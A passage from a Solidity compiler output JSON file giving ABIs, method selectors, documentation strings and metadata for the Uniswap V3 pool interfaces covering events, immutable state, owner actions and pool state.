					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"Collect\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"CollectProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid1\",\"type\":\"uint256\"}],\"name\":\"Flash\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextOld\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextNew\",\"type\":\"uint16\"}],\"name\":\"IncreaseObservationCardinalityNext\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0New\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1New\",\"type\":\"uint8\"}],\"name\":\"SetFeeProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"liquidity\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Swap\",\"type\":\"event\"}],\"devdoc\":{\"events\":{\"Burn(address,int24,int24,uint128,uint256,uint256)\":{\"details\":\"Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\",\"params\":{\"amount\":\"The amount of liquidity to remove\",\"amount0\":\"The amount of token0 withdrawn\",\"amount1\":\"The amount of token1 withdrawn\",\"owner\":\"The owner of the position for which liquidity is removed\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"Collect(address,address,int24,int24,uint128,uint128)\":{\"details\":\"Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\",\"params\":{\"amount0\":\"The amount of token0 fees collected\",\"amount1\":\"The amount of token1 fees collected\",\"owner\":\"The owner of the position for which fees are collected\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"CollectProtocol(address,address,uint128,uint128)\":{\"params\":{\"amount0\":\"The amount of token1 protocol fees that is withdrawn\",\"recipient\":\"The address that receives the collected protocol fees\",\"sender\":\"The address that collects the protocol fees\"}},\"Flash(address,address,uint256,uint256,uint256,uint256)\":{\"params\":{\"amount0\":\"The amount of token0 that was flashed\",\"amount1\":\"The amount of token1 that was flashed\",\"paid0\":\"The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\",\"paid1\":\"The amount of token1 paid for the flash, which can exceed the amount1 plus the fee\",\"recipient\":\"The address that received the tokens from flash\",\"sender\":\"The address that initiated the swap call, and that received the callback\"}},\"IncreaseObservationCardinalityNext(uint16,uint16)\":{\"details\":\"observationCardinalityNext is not the observation cardinality until an observation is written at the index just before a mint/swap/burn.\",\"params\":{\"observationCardinalityNextNew\":\"The updated value of the next observation cardinality\",\"observationCardinalityNextOld\":\"The previous value of the next observation cardinality\"}},\"Initialize(uint160,int24)\":{\"details\":\"Mint/Burn/Swap cannot be emitted by the pool before Initialize\",\"params\":{\"sqrtPriceX96\":\"The initial sqrt price of the pool, as a Q64.96\",\"tick\":\"The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool\"}},\"Mint(address,address,int24,int24,uint128,uint256,uint256)\":{\"params\":{\"amount\":\"The amount of liquidity minted to the position range\",\"amount0\":\"How much token0 was required for the minted liquidity\",\"amount1\":\"How much token1 was required for the minted liquidity\",\"owner\":\"The owner of the position and recipient of any minted liquidity\",\"sender\":\"The address that minted the liquidity\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"SetFeeProtocol(uint8,uint8,uint8,uint8)\":{\"params\":{\"feeProtocol0New\":\"The updated value of the token0 protocol fee\",\"feeProtocol0Old\":\"The previous value of the token0 protocol fee\",\"feeProtocol1New\":\"The updated value of the token1 protocol fee\",\"feeProtocol1Old\":\"The previous value of the token1 protocol fee\"}},\"Swap(address,address,int256,int256,uint160,uint128,int24)\":{\"params\":{\"amount0\":\"The delta of the token0 balance of the pool\",\"amount1\":\"The delta of the token1 balance of the pool\",\"liquidity\":\"The liquidity of the pool after the swap\",\"recipient\":\"The address that received the output of the swap\",\"sender\":\"The address that initiated the swap call, and that received the callback\",\"sqrtPriceX96\":\"The sqrt(price) of the pool after the swap, as a Q64.96\",\"tick\":\"The log base 1.0001 of price of the pool after the swap\"}}},\"kind\":\"dev\",\"methods\":{},\"title\":\"Events emitted by a pool\",\"version\":1},\"userdoc\":{\"events\":{\"Burn(address,int24,int24,uint128,uint256,uint256)\":{\"notice\":\"Emitted when a position's liquidity is removed\"},\"Collect(address,address,int24,int24,uint128,uint128)\":{\"notice\":\"Emitted when fees are collected by the owner of a position\"},\"CollectProtocol(address,address,uint128,uint128)\":{\"notice\":\"Emitted when the collected protocol fees are withdrawn by the factory owner\"},\"Flash(address,address,uint256,uint256,uint256,uint256)\":{\"notice\":\"Emitted by the pool for any flashes of token0/token1\"},\"IncreaseObservationCardinalityNext(uint16,uint16)\":{\"notice\":\"Emitted by the pool for increases to the number of observations that can be stored\"},\"Initialize(uint160,int24)\":{\"notice\":\"Emitted exactly once by a pool when #initialize is first called on the pool\"},\"Mint(address,address,int24,int24,uint128,uint256,uint256)\":{\"notice\":\"Emitted when liquidity is minted for a given position\"},\"SetFeeProtocol(uint8,uint8,uint8,uint8)\":{\"notice\":\"Emitted when the protocol fee is changed by the pool\"},\"Swap(address,address,int256,int256,uint160,uint128,int24)\":{\"notice\":\"Emitted by the pool for any swaps between token0 and token1\"}},\"kind\":\"user\",\"methods\":{},\"notice\":\"Contains all events emitted by the pool\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":\"IUniswapV3PoolEvents\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"events": {
							"Burn(address,int24,int24,uint128,uint256,uint256)": {
								"notice": "Emitted when a position's liquidity is removed"
							},
							"Collect(address,address,int24,int24,uint128,uint128)": {
								"notice": "Emitted when fees are collected by the owner of a position"
							},
							"CollectProtocol(address,address,uint128,uint128)": {
								"notice": "Emitted when the collected protocol fees are withdrawn by the factory owner"
							},
							"Flash(address,address,uint256,uint256,uint256,uint256)": {
								"notice": "Emitted by the pool for any flashes of token0/token1"
							},
							"IncreaseObservationCardinalityNext(uint16,uint16)": {
								"notice": "Emitted by the pool for increases to the number of observations that can be stored"
							},
							"Initialize(uint160,int24)": {
								"notice": "Emitted exactly once by a pool when #initialize is first called on the pool"
							},
							"Mint(address,address,int24,int24,uint128,uint256,uint256)": {
								"notice": "Emitted when liquidity is minted for a given position"
							},
							"SetFeeProtocol(uint8,uint8,uint8,uint8)": {
								"notice": "Emitted when the protocol fee is changed by the pool"
							},
							"Swap(address,address,int256,int256,uint160,uint128,int24)": {
								"notice": "Emitted by the pool for any swaps between token0 and token1"
							}
						},
						"kind": "user",
						"methods": {},
						"notice": "Contains all events emitted by the pool",
						"version": 1
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"IUniswapV3PoolImmutables": {
					"abi": [
						{
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "fee",
							"outputs": [
								{
									"internalType": "uint24",
									"name": "",
									"type": "uint24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "maxLiquidityPerTick",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"factory()": {
								"returns": {
									"_0": "The contract address"
								}
							},
							"fee()": {
								"returns": {
									"_0": "The fee"
								}
							},
							"maxLiquidityPerTick()": {
								"details": "This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool",
								"returns": {
									"_0": "The max amount of liquidity per tick"
								}
							},
							"tickSpacing()": {
								"details": "Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.",
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"token0()": {
								"returns": {
									"_0": "The token contract address"
								}
							},
							"token1()": {
								"returns": {
									"_0": "The token contract address"
								}
							}
						},
						"title": "Pool state that never changes",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"factory()": "c45a0155",
							"fee()": "ddca3f43",
							"maxLiquidityPerTick()": "70cf754a",
							"tickSpacing()": "d0c93a7c",
							"token0()": "0dfe1681",
							"token1()": "d21220a7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"internalType\":\"uint24\",\"name\":\"\",\"type\":\"uint24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityPerTick\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"factory()\":{\"returns\":{\"_0\":\"The contract address\"}},\"fee()\":{\"returns\":{\"_0\":\"The fee\"}},\"maxLiquidityPerTick()\":{\"details\":\"This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\",\"returns\":{\"_0\":\"The max amount of liquidity per tick\"}},\"tickSpacing()\":{\"details\":\"Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.\",\"returns\":{\"_0\":\"The tick spacing\"}},\"token0()\":{\"returns\":{\"_0\":\"The token contract address\"}},\"token1()\":{\"returns\":{\"_0\":\"The token contract address\"}}},\"title\":\"Pool state that never changes\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"factory()\":{\"notice\":\"The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\"},\"fee()\":{\"notice\":\"The pool's fee in hundredths of a bip, i.e. 1e-6\"},\"maxLiquidityPerTick()\":{\"notice\":\"The maximum amount of position liquidity that can use any tick in the range\"},\"tickSpacing()\":{\"notice\":\"The pool tick spacing\"},\"token0()\":{\"notice\":\"The first of the two tokens of the pool, sorted by address\"},\"token1()\":{\"notice\":\"The second of the two tokens of the pool, sorted by address\"}},\"notice\":\"These parameters are fixed for a pool forever, i.e., the methods will always return the same values\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":\"IUniswapV3PoolImmutables\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"factory()": {
								"notice": "The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface"
							},
							"fee()": {
								"notice": "The pool's fee in hundredths of a bip, i.e. 1e-6"
							},
							"maxLiquidityPerTick()": {
								"notice": "The maximum amount of position liquidity that can use any tick in the range"
							},
							"tickSpacing()": {
								"notice": "The pool tick spacing"
							},
							"token0()": {
								"notice": "The first of the two tokens of the pool, sorted by address"
							},
							"token1()": {
								"notice": "The second of the two tokens of the pool, sorted by address"
							}
						},
						"notice": "These parameters are fixed for a pool forever, i.e., the methods will always return the same values",
						"version": 1
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"IUniswapV3PoolOwnerActions": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collectProtocol",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "feeProtocol0",
									"type": "uint8"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol1",
									"type": "uint8"
								}
							],
							"name": "setFeeProtocol",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"collectProtocol(address,uint128,uint128)": {
								"params": {
									"amount0Requested": "The maximum amount of token0 to send, can be 0 to collect fees in only token1",
									"amount1Requested": "The maximum amount of token1 to send, can be 0 to collect fees in only token0",
									"recipient": "The address to which collected protocol fees should be sent"
								},
								"returns": {
									"amount0": "The protocol fee collected in token0",
									"amount1": "The protocol fee collected in token1"
								}
							},
							"setFeeProtocol(uint8,uint8)": {
								"params": {
									"feeProtocol0": "new protocol fee for token0 of the pool",
									"feeProtocol1": "new protocol fee for token1 of the pool"
								}
							}
						},
						"title": "Permissioned pool actions",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"collectProtocol(address,uint128,uint128)": "85b66729",
							"setFeeProtocol(uint8,uint8)": "8206a4d1"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collectProtocol\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"feeProtocol0\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol1\",\"type\":\"uint8\"}],\"name\":\"setFeeProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"collectProtocol(address,uint128,uint128)\":{\"params\":{\"amount0Requested\":\"The maximum amount of token0 to send, can be 0 to collect fees in only token1\",\"amount1Requested\":\"The maximum amount of token1 to send, can be 0 to collect fees in only token0\",\"recipient\":\"The address to which collected protocol fees should be sent\"},\"returns\":{\"amount0\":\"The protocol fee collected in token0\",\"amount1\":\"The protocol fee collected in token1\"}},\"setFeeProtocol(uint8,uint8)\":{\"params\":{\"feeProtocol0\":\"new protocol fee for token0 of the pool\",\"feeProtocol1\":\"new protocol fee for token1 of the pool\"}}},\"title\":\"Permissioned pool actions\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"collectProtocol(address,uint128,uint128)\":{\"notice\":\"Collect the protocol fee accrued to the pool\"},\"setFeeProtocol(uint8,uint8)\":{\"notice\":\"Set the denominator of the protocol's % share of the fees\"}},\"notice\":\"Contains pool methods that may only be called by the factory owner\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":\"IUniswapV3PoolOwnerActions\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"collectProtocol(address,uint128,uint128)": {
								"notice": "Collect the protocol fee accrued to the pool"
							},
							"setFeeProtocol(uint8,uint8)": {
								"notice": "Set the denominator of the protocol's % share of the fees"
							}
						},
						"notice": "Contains pool methods that may only be called by the factory owner",
						"version": 1
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"IUniswapV3PoolState": {
					"abi": [
						{
							"inputs": [],
							"name": "feeGrowthGlobal0X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal1X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "liquidity",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "index",
									"type": "uint256"
								}
							],
							"name": "observations",
							"outputs": [
								{
									"internalType": "uint32",
									"name": "blockTimestamp",
									"type": "uint32"
								},
								{
									"internalType": "int56",
									"name": "tickCumulative",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityCumulativeX128",
									"type": "uint160"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "key",
									"type": "bytes32"
								}
							],
							"name": "positions",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "_liquidity",
									"type": "uint128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside0LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside1LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "protocolFees",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "token0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "token1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "slot0",
							"outputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								},
								{
									"internalType": "uint16",
									"name": "observationIndex",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinality",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol",
									"type": "uint8"
								},
								{
									"internalType": "bool",
									"name": "unlocked",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int16",
									"name": "wordPosition",
									"type": "int16"
								}
							],
							"name": "tickBitmap",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "ticks",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "liquidityGross",
									"type": "uint128"
								},
								{
									"internalType": "int128",
									"name": "liquidityNet",
									"type": "int128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside0X128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside1X128",
									"type": "uint256"
								},
								{
									"internalType": "int56",
									"name": "tickCumulativeOutside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityOutsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsOutside",
									"type": "uint32"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"feeGrowthGlobal0X128()": {
								"details": "This value can overflow the uint256"
							},
							"feeGrowthGlobal1X128()": {
								"details": "This value can overflow the uint256"
							},
							"liquidity()": {
								"details": "This value has no relationship to the total liquidity across all ticks"
							},
							"observations(uint256)": {
								"details": "You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.",
								"params": {
									"index": "The element of the observations array to fetch"
								},
								"returns": {
									"blockTimestamp": "The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use"
								}
							},
							"positions(bytes32)": {
								"params": {
									"key": "The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper"
								},
								"returns": {
									"_liquidity": "The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
								}
							},
							"protocolFees()": {
								"details": "Protocol fees will never exceed uint128 max in either token"
							},
							"slot0()": {
								"returns": {
